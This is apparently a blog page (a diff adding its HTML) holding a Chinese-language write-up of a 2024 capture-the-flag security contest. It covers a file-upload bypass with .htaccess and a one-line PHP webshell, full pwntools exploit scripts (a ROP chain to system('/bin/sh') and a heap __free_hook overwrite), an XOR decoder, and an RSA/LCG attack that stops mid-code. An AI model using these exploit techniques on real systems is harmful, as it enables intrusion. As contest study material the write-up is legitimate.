@@ -1,0 +1,789 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/ggg.png">
+  <link rel="icon" href="/img/ggg.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="g0at">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="第四届“长城杯”网络安全大赛暨京津冀网络安全技能竞赛Write Up">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第四届“长城杯”网络安全大赛">
+<meta property="og:url" content="https://g1at.github.io/2024/09/08/ccb2024/index.html">
+<meta property="og:site_name" content="g0at&#39;s Blog">
+<meta property="og:description" content="第四届“长城杯”网络安全大赛暨京津冀网络安全技能竞赛Write Up">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://g1at.github.io/mdimg/CCB2024/CCB2024.png">
+<meta property="article:published_time" content="2024-09-08T09:24:02.000Z">
+<meta property="article:modified_time" content="2024-10-03T16:46:45.951Z">
+<meta property="article:author" content="g0at">
+<meta property="article:tag" content="Write Up">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://g1at.github.io/mdimg/CCB2024/CCB2024.png">
+  
+  
+  
+  <title>第四届“长城杯”网络安全大赛 - g0at&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/mac.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"g1at.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":80,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"rF6DPbqXmz9oaKXSwioOtyuv-gzGzoHsz","app_key":"7WylA7nweHQ3Z3Y3lnez5NTm","server_url":"https://rf6dpbqx.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>g0at&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/wp.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="第四届“长城杯”网络安全大赛"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        g0at
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-08 17:24" pubdate>
+          2024年9月8日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          59 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">第四届“长城杯”网络安全大赛</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="SQLUP"><a href="#SQLUP" class="headerlink" title="SQLUP"></a>SQLUP</h4><p>爆破得到账号admin 密码1</p>
+<p>发现文件上传过滤了字母p</p>
+<p><img src="/mdimg/CCB2024/1.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>上传.htaccess：AddType application/x-httpd-php .txt 解析.txt为php</p>
+<p>传一句话木马</p>
+<p><img src="/mdimg/CCB2024/2.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>tac /flag得到flag</p>
+<h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="FlowerShop"><a href="#FlowerShop" class="headerlink" title="FlowerShop"></a>FlowerShop</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> varname import argname<br><br><span class="hljs-title function_ invoke__">context</span>(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># context.log_level=&#x27;debug&#x27;</span><br>file = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = <span class="hljs-title function_ invoke__">ELF</span>(file)<br>p = <span class="hljs-title function_ invoke__">process</span>(file)<br>lk = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_ invoke__">split</span>()<br>p=<span class="hljs-title function_ invoke__">remote</span>(<span class="hljs-string">&quot;8.147.129.22&quot;</span>,<span class="hljs-number">15172</span>)<br>context.terminal = [<span class="hljs-string">&#x27;ssh-gdb-helper&#x27;</span>]<br><br>pr  = <span class="hljs-keyword">print</span><br>pa  = lambda      : <span class="hljs-title function_ invoke__">pause</span>()<br>re  = lambda m, t : p.<span class="hljs-title function_ invoke__">recv</span>(numb=m, timeout=t)<br>ru  = lambda x, y=<span class="hljs-number">0</span>    : p.<span class="hljs-title function_ invoke__">recvuntil</span>(x, drop=y)<br>rl  = lambda      : p.<span class="hljs-title function_ invoke__">recvline</span>()<br>sd  = lambda x    : p.<span class="hljs-title function_ invoke__">send</span>(x)<br>sl  = lambda x    : p.<span class="hljs-title function_ invoke__">sendline</span>(x)<br>ia  = lambda      : p.<span class="hljs-title function_ invoke__">interactive</span>()<br>sla = lambda a, b : p.<span class="hljs-title function_ invoke__">sendlineafter</span>(a, b)<br>sa  = lambda a, b : p.<span class="hljs-title function_ invoke__">sendafter</span>(a, b)<br>uu32 = lambda x   : <span class="hljs-title function_ invoke__">u32</span>(x.<span class="hljs-title function_ invoke__">ljust</span>(<span class="hljs-number">4</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>uu64 = lambda x   : <span class="hljs-title function_ invoke__">u64</span>(x.<span class="hljs-title function_ invoke__">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>pv   = lambda x   : <span class="hljs-title function_ invoke__">success</span>(<span class="hljs-string">&#x27;%s: %s&#x27;</span>%(<span class="hljs-title function_ invoke__">argname</span>(<span class="hljs-string">&#x27;x&#x27;</span>), <span class="hljs-title function_ invoke__">hex</span>(x)))<br><br>def <span class="hljs-title function_ invoke__">lzsl</span>(exp):<br>    <span class="hljs-title function_ invoke__">sl</span>(exp)<br>    <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">0.3</span>)<br><br>padding = <span class="hljs-number">61</span><br><span class="hljs-title function_ invoke__">sl</span>(b<span class="hljs-string">&#x27;pwn\x00&#x27;</span>*<span class="hljs-number">15</span>)<br><br><span class="hljs-title function_ invoke__">lzsl</span>(b<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-title function_ invoke__">lzsl</span>(b<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-title function_ invoke__">lzsl</span>(b<span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-title function_ invoke__">lzsl</span>(b<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-title function_ invoke__">lzsl</span>(b<span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-title function_ invoke__">lzsl</span>(b<span class="hljs-string">&#x27;c&#x27;</span>)<br><span class="hljs-title function_ invoke__">lzsl</span>(b<span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-comment"># gdb.attach(p,&quot;&quot;&quot;b *0x000400CC1 if *$rdi != 0</span><br><span class="hljs-comment"># b *0x0000400CE4</span><br><span class="hljs-comment"># b *0x0000400A0E</span><br><span class="hljs-comment"># b *0x00004009FF&quot;&quot;&quot;)</span><br><span class="hljs-title function_ invoke__">lzsl</span>(b<span class="hljs-string">&#x27;b&#x27;</span>)<br><span class="hljs-comment"># lzsl(b&#x27;1&#x27;)</span><br><br>system_plt = <span class="hljs-number">0x400730</span><br>binsh = <span class="hljs-number">0x601840</span><br><br><span class="hljs-comment"># 0x0000000000400f13 : pop rdi ; ret</span><br><span class="hljs-comment"># 0x00000000004006f6 : ret</span><br>rdi = <span class="hljs-number">0x400f13</span><br>ret = <span class="hljs-number">0x4006f6</span><br>padding = <span class="hljs-number">24</span><br>exp = <span class="hljs-title function_ invoke__">flat</span>(<br>    <span class="hljs-title function_ invoke__">cyclic</span>(padding),<br>    ret,<br>    rdi,<br>    binsh,<br>    system_plt<br>)<br>assert <span class="hljs-title function_ invoke__">len</span>(exp) &lt;= <span class="hljs-number">0x46</span><br><span class="hljs-title function_ invoke__">sl</span>(exp)<br><span class="hljs-title function_ invoke__">ia</span>()<br></code></pre></td></tr></table></figure>
+
+<h4 id="Kylin-Heap"><a href="#Kylin-Heap" class="headerlink" title="Kylin_Heap"></a>Kylin_Heap</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> varname <span class="hljs-keyword">import</span> argname<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>file = <span class="hljs-string">&#x27;./Heap&#x27;</span><br>elf = ELF(file)<br>p = process(file)<br>lk = <span class="hljs-string">&#x27;8.147.134.24 22923&#x27;</span>.split()<br><span class="hljs-comment"># p = remote(lk[0], lk[1])</span><br>context.terminal = [<span class="hljs-string">&#x27;ssh-gdb-helper&#x27;</span>]<br><br>pr  = <span class="hljs-built_in">print</span><br>pa  = <span class="hljs-keyword">lambda</span>      : pause()<br>re  = <span class="hljs-keyword">lambda</span> m, t : p.recv(numb=m, timeout=t)<br>ru  = <span class="hljs-keyword">lambda</span> x, y=<span class="hljs-number">0</span>    : p.recvuntil(x, drop=y)<br>rl  = <span class="hljs-keyword">lambda</span>      : p.recvline()<br>sd  = <span class="hljs-keyword">lambda</span> x    : p.send(x)<br>sl  = <span class="hljs-keyword">lambda</span> x    : p.sendline(x)<br>ia  = <span class="hljs-keyword">lambda</span>      : p.interactive()<br>sla = <span class="hljs-keyword">lambda</span> a, b : p.sendlineafter(a, b)<br>sa  = <span class="hljs-keyword">lambda</span> a, b : p.sendafter(a, b)<br>uu32 = <span class="hljs-keyword">lambda</span> x   : u32(x.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> x   : u64(x.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>pv   = <span class="hljs-keyword">lambda</span> x   : success(<span class="hljs-string">&#x27;%s: %s&#x27;</span>%(argname(<span class="hljs-string">&#x27;x&#x27;</span>), <span class="hljs-built_in">hex</span>(x)))<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    ru(<span class="hljs-string">b&#x27;(1 to 1280 bytes):&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(size))<br>    ru(<span class="hljs-string">b&#x27;bytes):&#x27;</span>)<br>    sl(content)<br>    sleep(<span class="hljs-number">0.5</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sl(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    ru(<span class="hljs-string">b&#x27;Enter the index (0-19):&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index))<br>    sleep(<span class="hljs-number">0.5</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sl(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    ru(<span class="hljs-string">b&#x27;(0-19):&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index))<br>    sleep(<span class="hljs-number">0.5</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    sl(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    ru(<span class="hljs-string">b&#x27;Enter the index (0-19):&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index))<br>    ru(<span class="hljs-string">b&#x27;bytes):&#x27;</span>)<br>    sl(content)<br>    sleep(<span class="hljs-number">0.5</span>)<br><br>add(<span class="hljs-number">0x4f0</span>,<span class="hljs-string">&quot;aaaa&quot;</span>)<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&quot;bbbb&quot;</span>)<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&quot;cccc&quot;</span>)<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&quot;dddd&quot;</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">0</span>)<br>pa()<br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">&quot;[0]:\n&quot;</span>)<br>libc_base = uu64(re(<span class="hljs-number">6</span>,<span class="hljs-number">2</span>)) - <span class="hljs-number">0x1ebbe0</span><br>edit(<span class="hljs-number">2</span>,p64(libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]))<br><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>add(<span class="hljs-number">0x68</span>,p64(libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>pv(libc_base)<br><br><span class="hljs-comment"># gdb.attach(p)</span><br>delete(<span class="hljs-number">2</span>)<br>ia()<br></code></pre></td></tr></table></figure>
+
+<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h4><p><img src="/mdimg/CCB2024/3.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/mdimg/CCB2024/4.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">enc = [<br>    <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x03</span>, <br>    <span class="hljs-number">0x04</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x02</span>, <br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x57</span>, <br>    <span class="hljs-number">0x05</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x04</span>, <br>    <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x77</span><br>]<br><br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-title function_ invoke__">len</span>(enc)-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>    enc[i] ^= enc[(i+<span class="hljs-number">1</span>) % <span class="hljs-title function_ invoke__">len</span>(enc)]<br><br>result_string = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_ invoke__">join</span>([<span class="hljs-title function_ invoke__">chr</span>(byte) <span class="hljs-keyword">for</span> byte in enc])<br><span class="hljs-keyword">print</span>(result_string)<br><br><span class="hljs-comment">#flag&#123;fcf94739-da66-467c-a77f-b50d12a67437&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="RandomRSA"><a href="#RandomRSA" class="headerlink" title="RandomRSA"></a>RandomRSA</h4><p>通过LCG的递推公式，可以得到：<br>$$<br>X_{n+1} = aX_n + b \pmod p \<br>n = pq = (X_n + \epsilon_1)(aX_{n} + b + \epsilon_2) \<br>$$</p>
+<p>显然这是在<br>$$<br> Z^*_p<br>$$<br> 下关于<br>$$<br>X<br>$$<br>的 二次方程。如果没有 next_prime 这个函数增加的小量<br>$$<br>\epsilon<br>$$<br>，那么直接解这个方程就能得到<br>$$<br>X<br>$$<br>。<br>但是由于有这两个误差，而经过测试，发现这个误差是完全可预测的，大概在<br>$$<br> (0,1000)<br>$$<br>这个范围，所以可以利用这个来爆破计算<br>$$<br>X<br>$$<br> 。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">var(<span class="hljs-string">&quot;x1,a,b,e1,e2,n&quot;</span>)<br><br>f = (x1 + e1)*(a*x1 + b + e2) - n<br>expand(f)<br><br><span class="hljs-comment"># a*e1*x1 + a*x1^2 + b*e1 + e1*e2 + b*x1 + e2*x1 - n</span><br></code></pre></td></tr></table></figure>
+
+<p>即 </p>
+<p>$$<br>aX^2 + (b + e_2 + ae_1)X + (be_1 + e_1e_2 - n) = 0 \pmod p<br>$$<br>这里可以使用 <code>sagemath</code> 的 <code>roots</code> 进行爆破，但是由于 <code>roots</code> 但是解根的时间是比较久的，所以可以采用求根公式，验证<br>$$<br>\Delta = B^2 - 4AC<br>$$<br>是否在<br>$$<br>Z^*_p<br>$$<br> 下正好是二次剩余，以减少爆破的次数。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python">p,a,b = <br>n,c = <br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>    flag = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        A = a<br>        B = (b + j + a*i)<br>        C = (b*i + i*j - n)<br>        delta = B**<span class="hljs-number">2</span> - <span class="hljs-number">4</span>*A*C<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">pow</span>(delta, (p - <span class="hljs-number">1</span>) // <span class="hljs-number">2</span>, p) != <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">continue</span><br>        roots = Zmod(p)(delta).sqrt(<span class="hljs-built_in">all</span>=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">for</span> root <span class="hljs-keyword">in</span> roots:<br>            root = Integer(root)<br>            x = (-B + root )*inverse_mod(<span class="hljs-number">2</span>*A,p) % p<br>            <span class="hljs-keyword">if</span> n % (x + i) == <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span>(i,j)<br>                <span class="hljs-built_in">print</span>(x+i)<br>                flag = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> flag:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> flag:<br>        <span class="hljs-keyword">break</span><br><br>q = <span 